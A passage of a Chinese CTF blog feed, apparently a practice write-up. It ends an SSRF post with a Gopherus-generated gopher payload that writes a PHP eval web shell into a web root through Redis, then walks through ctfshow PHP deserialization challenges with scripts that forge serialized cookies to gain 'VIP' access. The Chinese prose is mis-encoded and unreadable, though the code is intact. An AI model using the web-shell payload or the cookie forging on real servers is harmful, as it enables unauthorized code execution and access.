class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¹ˆç”¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿MSI)-[/home/g01den/Tools/Gopherus]</span><br><span class="line">â””â”€# python2 gopherus.py --exploit redis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell/PHPShell): php</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php eval($_post[1]);?&gt;</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_post%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br><span class="line">When it&#x27;s done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter.</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></table></figure><p>â€‹ä¸çŸ¥ä¸ºå•¥ï¼Œæˆ‘çš„è¿˜æ˜¯ç”¨ä¸äº†ï¼Œä¸è¿‡ï¼Œç…§ç†æ¥è¯´ï¼Œå‘é€äº†ä¹‹åè®¿é—® shell.php å°±èƒ½ rce äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-ååºåˆ—åŒ–</title>
      <link href="/posts/4fb535d6.html"/>
      <url>/posts/4fb535d6.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€äº›åŸºç¡€"><a class="markdownIt-Anchor" href="#ä¸€äº›åŸºç¡€">#</a> ä¸€äº›åŸºç¡€ï¼š</h1><blockquote><p>private å˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼š\x00 ç±»å \x00 å˜é‡å<br> protected å˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸º: \x00*\x00 å˜é‡å<br> public å˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼šå˜é‡å</p><p>__sleep ()    // åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ  *</p><p>__wakeup ()   // å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è°ƒç”¨ï¼ˆå½“ååºåˆ—åŒ–æ—¶å˜é‡ä¸ªæ•°ä¸å®é™…ä¸ç¬¦æ˜¯ä¼šç»•è¿‡ï¼‰  *<br> å¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† __unserialize () å’Œ __wakeup () ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œ åˆ™åªæœ‰ __unserialize () æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ<strong>wakeup () æ–¹æ³•ä¼šè¢«å¿½ç•¥ã€‚æ­¤ç‰¹æ€§è‡ª PHP 7.4.0 èµ·å¯ç”¨ã€‚</strong></p><p>construct () // å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œä¼šè§¦å‘è¿›è¡Œåˆå§‹åŒ–<br>__destruct () // å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__toString ()ï¼š // å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘<br>__call () // åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic () // åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__get () // è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ï¼Œç”¨äºä»ä¸å¯è®¿é—®çš„</p><p>å±æ€§è¯»å–æ•°æ®ï¼ˆä¸å¯è®¿é—®çš„å±æ€§åŒ…æ‹¬ï¼š1. å±æ€§æ˜¯ç§æœ‰å‹ã€‚2. ç±»ä¸­ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡ï¼‰<br>__set () // ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</p><p>__isset () // åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset () æˆ– empty () è§¦å‘<br>__unset () // åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨ unset () æ—¶è§¦å‘</p><p>__toString () // æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘<br>__invoke () // å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶</p></blockquote><h1 id="web254"><a class="markdownIt-Anchor" href="#web254">#</a> web254</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜å°±æ˜¯ç®€å•çš„é€»è¾‘ï¼Œé¦–å…ˆæ˜¯ç™»é™†ï¼Œåˆ¤æ–­è´¦å·å¯†ç æ˜¯å¦ä¸º xxxxxxï¼Œæ˜¯çš„è¯ isVip åˆ™è¿”å› trueï¼Œä¹‹åæ£€æµ‹ isVip æ˜¯å¦ä¸º trueï¼Œæ˜¯çš„è¯å°±è¾“å‡º flagã€‚</p><p>â€‹å› æ­¤ï¼Œç›´æ¥ get ä¼ ä¸¤ä¸ªå‚æ•°ï¼Œusername å’Œ password éƒ½æ˜¯ xxxxxx å³å¯å‡º flagã€‚</p><h1 id="web255"><a class="markdownIt-Anchor" href="#web255">#</a> web255ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹é€»è¾‘æŒºç®€å•çš„ï¼Œå°±æ˜¯ä» cookie å–ä¸€ä¸ªåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™ä¸ªç±»å°±å®ä¾‹åŒ–æˆä¸€ä¸ªå¯¹è±¡ userï¼Œç„¶åå¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œæ“ä½œï¼Œè¿›è¡Œ loginï¼Œä½†æ˜¯ login åªä¼šè¿”å›ä¸€ä¸ªçœŸæˆ–è€…å‡ï¼Œä¸ä¼šæ“ä½œ isVip å‚æ•°ï¼Œä¹‹åçš„ checkVip ä¼šæ£€æµ‹ isVip çš„å€¼ï¼Œä¸ºçœŸåˆ™è¾“å‡º flagï¼Œæ‰€ä»¥ï¼Œç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¦æ±‚æ˜¯ isVip å±æ€§å¾—æ˜¯çœŸï¼Œæ‰€ä»¥ç”Ÿæˆçš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h1 id="web256"><a class="markdownIt-Anchor" href="#web256">#</a> web256ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªé¢˜åœ¨è¿™ä¸ªå‡½æ•°é‡Œæœ‰ä¸ªé—®é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå¾ˆæ˜æ˜¾ï¼Œå½“è´¦å·å’Œå¯†ç ç›¸ç­‰çš„æ—¶å€™ï¼Œå°±ä¸ä¼šè¾“å‡º flagï¼Œå½“ä¸ç­‰çš„æ—¶å€™å°±è¾“å‡ºï¼Œæ‰€ä»¥ï¼Œéœ€è¦é€šè¿‡ååºåˆ—åŒ–å°† username æˆ–è€… password æ”¹ä¸€ä¸ªï¼Œä½¿ä»–ä»¬ä¸ç›¸ç­‰ï¼Œä¹‹å get ä¼ å‚çš„æ—¶å€™ä¼ å…¥ä¿®æ”¹ä¹‹åçš„å°±è¡Œäº†ã€‚ç”Ÿæˆ cookie çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?username=xxxxxx&amp;password=xxxxx</span><br></pre></td></tr></table></figure><h1 id="web257"><a class="markdownIt-Anchor" href="#web257">#</a> web257ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span 